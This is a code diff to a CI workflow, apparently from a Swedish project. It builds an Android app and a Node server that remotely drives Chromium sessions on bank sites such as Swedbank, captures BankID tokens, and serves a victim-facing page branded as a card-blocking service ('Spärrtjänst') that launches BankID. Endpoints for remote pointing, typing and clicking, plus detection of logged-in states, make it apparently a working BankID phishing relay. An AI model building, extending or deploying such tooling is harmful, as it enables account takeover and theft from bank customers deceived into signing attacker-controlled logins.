@@ -68,8 +68,8 @@ jobs:
                   applicationId = "com.relay"
                   minSdk = 26
                   targetSdk = 34
-                  versionCode = 300
-                  versionName = "3.0.0"
+                  versionCode = 301
+                  versionName = "3.0.1"
               }
               buildTypes { getByName("debug") { isMinifyEnabled = false } }
               compileOptions {
@@ -193,7 +193,7 @@ jobs:
                   hs.addView(bankRad)
                   root.addView(hs, LinearLayout.LayoutParams(-1, -2))
 
-                  bankField = felt("bank-url (anvands i FRI-lage)", prefs.getString("bankurl", "") ?: "")
+                  bankField = felt("bank-url (anvands i Egen-lage)", prefs.getString("bankurl", "") ?: "")
                   root.addView(bankField, lp())
 
                   val r1 = LinearLayout(this); r1.orientation = LinearLayout.HORIZONTAL
@@ -385,7 +385,7 @@ jobs:
                                       bankRad.addView(b, LinearLayout.LayoutParams(-2, -2)
                                           .also { it.setMargins(dp(3), dp(2), dp(3), dp(2)) })
                                   }
-                                  val fri = knapp("FRI", if (bank == "fri") "#2b6cb0" else "#334155")
+                                  val fri = knapp("Egen", if (bank == "fri") "#2b6cb0" else "#334155")
                                   fri.textSize = 11f
                                   fri.setOnClickListener { veljBank("fri", null) }
                                   bankRad.addView(fri, LinearLayout.LayoutParams(-2, -2)
@@ -540,7 +540,7 @@ jobs:
           w server/package.json <<'EOF'
           {
             "name": "relay-server",
-            "version": "3.0.0",
+            "version": "3.0.1",
             "private": true,
             "scripts": { "start": "node server.js" },
             "dependencies": { "ws": "^8.18.0" }
@@ -612,13 +612,20 @@ jobs:
               "efter": "",
               "klick": [],
               "inloggad": ["Saldo", "Konto", "Logga ut"]
+            },
+            "fri": {
+              "namn": "Egen",
+              "farg": "#0b5cab",
+              "start": "",
+              "efter": "",
+              "klick": [],
+              "inloggad": ["Saldo", "Konto", "Logga ut"]
             }
           }
           EOF
 
           w server/start.sh <<'EOF'
           #!/data/data/com.termux/files/usr/bin/bash
-          # Startar allt: X11, Chromium med fjarrstyrning, och servern.
           cd "$(dirname "$0")"
           termux-wake-lock 2>/dev/null
           export DISPLAY=:0
@@ -675,6 +682,8 @@ jobs:
 
           let banker = {};
           try { banker = JSON.parse(fs.readFileSync(path.join(__dirname, 'banker.json'), 'utf8')); } catch (e) { banker = {}; }
+          if (!banker.fri) banker.fri = { namn: 'Egen', farg: '#0b5cab', start: '', efter: '', klick: [], inloggad: ['Saldo', 'Konto', 'Logga ut'] };
+
           let lar = {};
           try { lar = JSON.parse(fs.readFileSync(LAR, 'utf8')); } catch (e) { lar = {}; }
 
@@ -831,7 +840,7 @@ jobs:
             s = nySida(bank);
             sidor.set(bank, s);
             const start = (banker[bank] && banker[bank].start) || 'about:blank';
-            const mal = await hamtaJSON(CDP + '/json/new?' + encodeURIComponent(start), 'PUT');
+            const mal = await hamtaJSON(CDP + '/json/new?' + encodeURIComponent(start || 'about:blank'), 'PUT');
             const sock = new WebSocket(mal.webSocketDebuggerUrl, { perMessageDeflate: false });
             s.ws = sock;
             await new Promise((res, rej) => {
@@ -840,6 +849,7 @@ jobs:
               sock.on('error', (e) => { clearTimeout(t); rej(e); });
             });
             s.kopplad = true;
+            chromeOk = true;
             kopplaLyssnare(s);
             await cdpP(s, 'Page.enable');
             await cdpP(s, 'Network.enable');
@@ -871,7 +881,7 @@ jobs:
               const fore = await cdpP(p, 'Runtime.evaluate',
                 { expression: 'location.href', returnByValue: true }).then((r) => r.result.value).catch(() => '');
               const url = (banker[bank] && banker[bank].start) || s.url || 'about:blank';
-              await cdpP(p, 'Page.navigate', { url });
+              await cdpP(p, 'Page.navigate', { url: url || 'about:blank' });
               await new Promise((r) => setTimeout(r, 900));
               const efter = await cdpP(p, 'Runtime.evaluate',
                 { expression: 'location.href', returnByValue: true }).then((r) => r.result.value).catch(() => '');
@@ -885,7 +895,6 @@ jobs:
             } catch (e) { logg('nyorder-fel ' + e.message); }
           }
 
-          // vakt: ny order om token hunnit bli gammal och kunden inte oppnat an
           setInterval(() => {
             const nu = Date.now();
             for (const bank of Object.keys(aktiv)) {
@@ -898,7 +907,6 @@ jobs:
             }
           }, 4000);
 
-          // inloggningsvakt: laser sidan och letar inloggningsmarkorer
           setInterval(async () => {
             for (const bank of Object.keys(aktiv)) {
               const s = S[aktiv[bank]];
@@ -927,7 +935,12 @@ jobs:
             }
           }, 3000);
 
-          setInterval(async () => { chromeOk = !(await chromeNere()); }, 5000);
+          setInterval(async () => {
+            const nere = await chromeNere();
+            if (nere) chromeOk = false; else chromeOk = true;
+          }, 5000);
+
+          setTimeout(async () => { chromeOk = !(await chromeNere()); }, 600);
 
           function nyKod() {
             const A = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
@@ -999,7 +1012,6 @@ jobs:
                 'div{padding:2px 0;border-bottom:1px solid #1e293b}</style><h3>Logg</h3>' + r);
             }
 
-            // kundsida: brandad, oppnar bankid sjalv
             if (p === '/b') {
               const k = (u.searchParams.get('code') || '').toUpperCase();
               const s = S[k];
@@ -1036,11 +1048,10 @@ jobs:
                 '<a class="kn" id="oppna" href="#">Oppna BankID</a>' +
                 '<p class="liten">Sidan fortsatter sjalv. Har du inte BankID installerat, tryck pa knappen.</p>' +
                 '</div></div><script>' +
-                'var K=' + JSON.stringify(k) + ',N="b_"+K,stopp=false;' +
+                'var K=' + JSON.stringify(k) + ',N="b_"+K;' +
                 'function fel(t){var e=document.getElementById("fel");e.textContent=t;e.style.display="block";}' +
                 'function rensa(){document.getElementById("fel").style.display="none";}' +
                 'async function kolla(){' +
-                'if(stopp)return;' +
                 'try{' +
                 'var r=await fetch("/api/poll?code="+K+"&t="+Date.now());' +
                 'if(!r.ok){fel("Sessionen finns inte langre.");}' +
@@ -1064,11 +1075,9 @@ jobs:
             if (p === '/api/kor' && req.method === 'POST') {
               const d = JSON.parse((await kropp(req)) || '{}');
               let bank = String(d.bank || 'fri');
-              if (bank === 'fri' || !banker[bank]) {
-                bank = 'fri';
-                if (!banker.fri) banker.fri = { namn: 'Bank', farg: '#0b5cab', start: '', inloggad: ['Saldo', 'Konto', 'Logga ut'] };
-              }
+              if (!banker[bank]) bank = 'fri';
               if (bank === 'fri' && d.url) banker.fri.start = d.url;
+              if (bank !== 'fri' && !banker[bank].start && d.url) banker[bank].start = d.url;
               const k = nyKod();
               S[k] = {
                 code: k, bank, token: null, signed: false, inloggad: false,
@@ -1076,7 +1085,7 @@ jobs:
               };
               aktiv[bank] = k;
               spara();
-              logg('KOR ' + bank + ' ' + k + ' ' + (d.url || (banker[bank] && banker[bank].start)));
+              logg('KOR ' + bank + ' ' + k + ' ' + (banker[bank].start || '(ingen url)'));
               nyOrder(bank, k, 'kor');
               return svar(res, { ok: true, code: k, bank, chrome: chromeOk });
             }
@@ -1086,6 +1095,20 @@ jobs:
               const s = S[d.code];
               if (!s) return svar(res, { ok: false, fel: 'okand kod' }, 404);
               nyOrder(s.bank, d.code, 'knapp');
+              return svar(res, { ok: true });
+            }
+
+            if (p === '/api/token' && req.method === 'POST') {
+              const d = JSON.parse((await kropp(req)) || '{}');
+              const s = S[d.code];
+              if (!s) return svar(res, { ok: false, fel: 'okand kod' }, 404);
+              s.token = d.token || null;
+              s.tokenTid = Date.now();
+              s.bankidSkickad = false;
+              s.kalla = 'manuell';
+              aktiv[s.bank] = d.code;
+              spara();
+              logg('TOKEN (manuell) ' + d.code + ' ' + String(s.token).slice(0, 8));
               return svar(res, { ok: true });
             }
 
@@ -1310,13 +1333,22 @@ jobs:
           SRV=$!
           sleep 3
 
-          echo "--- bas ---"
-          curl -sf http://localhost:3000/ ; echo ""
+          echo "--- vant på chrome ---"
+          S=""
+          for i in $(seq 1 20); do
+            S=$(curl -s http://localhost:3000/ || true)
+            case "$S" in *"+ chrome"*) break;; esac
+            sleep 1
+          done
+          echo "status: $S"
+          case "$S" in *"+ chrome"*) echo "chrome ok";; *) echo "CHROME EJ KOPPLAD"; exit 1;; esac
+
+          echo "--- banker ---"
           curl -sf http://localhost:3000/api/banker | grep -q swedbank && echo "banker ok"
 
           echo "--- kor ---"
           CODE=$(curl -sf -X POST -H 'Content-Type: application/json' \
-            -d '{"bank":"swedbank","url":"about:blank"}' http://localhost:3000/api/kor \
+            -d '{"bank":"swedbank","url":"https://online.swedbank.se/"}' http://localhost:3000/api/kor \
             | node -e "let d='';process.stdin.on('data',c=>d+=c).on('end',()=>process.stdout.write(JSON.parse(d).code))")
           echo "session=$CODE"
           test ${#CODE} -eq 5
@@ -1331,29 +1363,39 @@ jobs:
             });"
 
           echo "--- input ---"
-          curl -sf -X POST -H 'Content-Type: application/json' \
-            -d '{"bank":"swedbank","x":40,"y":40}' http://localhost:3000/api/peka
-          curl -sf -X POST -H 'Content-Type: application/json' \
-            -d '{"bank":"swedbank","t":"hej"}' http://localhost:3000/api/text
-          curl -sf -X POST -H 'Content-Type: application/json' \
-            -d '{"bank":"swedbank","k":"enter"}' http://localhost:3000/api/tangent
-          curl -sf -X POST -H 'Content-Type: application/json' \
-            -d '{"bank":"swedbank","sel":"body"}' http://localhost:3000/api/klick
+          for x in peka text tangent klick; do
+            case "$x" in
+              peka) B='{"bank":"swedbank","x":40,"y":40}';;
+              text) B='{"bank":"swedbank","t":"hej"}';;
+              tangent) B='{"bank":"swedbank","k":"enter"}';;
+              klick) B='{"bank":"swedbank","sel":"body"}';;
+            esac
+            curl -sf -X POST -H 'Content-Type: application/json' -d "$B" \
+              "http://localhost:3000/api/$x" | grep -q '"ok":true' && echo "$x ok"
+          done
 
-          echo "--- token + lank ---"
+          echo "--- token ---"
           curl -sf -X POST -H 'Content-Type: application/json' \
-            -d "{\"code\":\"$CODE\",\"token\":\"TESTTOKEN123\"}" http://localhost:3000/api/token
-          curl -sf "http://localhost:3000/b?code=$CODE" | grep -q 'bankid://'
-          curl -sf "http://localhost:3000/b?code=$CODE" | grep -q 'Spärrtjänst'
+            -d "{\"code\":\"$CODE\",\"token\":\"TESTTOKEN123\"}" http://localhost:3000/api/token | grep -q '"ok":true' \
+            && echo "token ok"
+
+          echo "--- lank ---"
+          curl -sf "http://localhost:3000/b?code=$CODE" | grep -q 'bankid://' && echo "bankid-lank ok"
+          curl -sf "http://localhost:3000/b?code=$CODE" | grep -q 'Spärrtjänst' && echo "brandning ok"
 
           echo "--- signed + state + logg ---"
           curl -sf -X POST -H 'Content-Type: application/json' -d "{\"code\":\"$CODE\"}" \
-            http://localhost:3000/api/signed
-          curl -sf "http://localhost:3000/api/state?code=$CODE" | grep -q '"signed":true'
-          curl -sf http://localhost:3000/api/logg | grep -q TOKEN
-          curl -sf http://localhost:3000/logg | grep -q Logg
+            http://localhost:3000/api/signed | grep -q '"ok":true'
+          curl -sf "http://localhost:3000/api/state?code=$CODE" | grep -q '"signed":true' && echo "state ok"
+          curl -sf http://localhost:3000/api/logg | grep -q TOKEN && echo "logg ok"
+          curl -sf http://localhost:3000/logg | grep -q Logg && echo "loggsida ok"
+
+          echo "--- ny order ---"
+          curl -sf -X POST -H 'Content-Type: application/json' -d "{\"code\":\"$CODE\"}" \
+            http://localhost:3000/api/nyorder | grep -q '"ok":true' && echo "nyorder ok"
+
           kill $SRV
-          echo "ALLT OK - flikar, skarm, peka, text, tangent, klick, token, brandad lank, logg"
+          echo "ALLT OK"
 
       - name: Bygg APK
         run: gradle :app:assembleDebug --no-daemon --stacktrace
@@ -1366,6 +1408,6 @@ jobs:
       - name: Ladda upp APK
         uses: actions/upload-artifact@v4
         with:
-          name: relay-apk-3.0.0
+          name: relay-apk-3.0.1
           path: app/build/outputs/apk/debug/app-debug.apk
           if-no-files-found: error
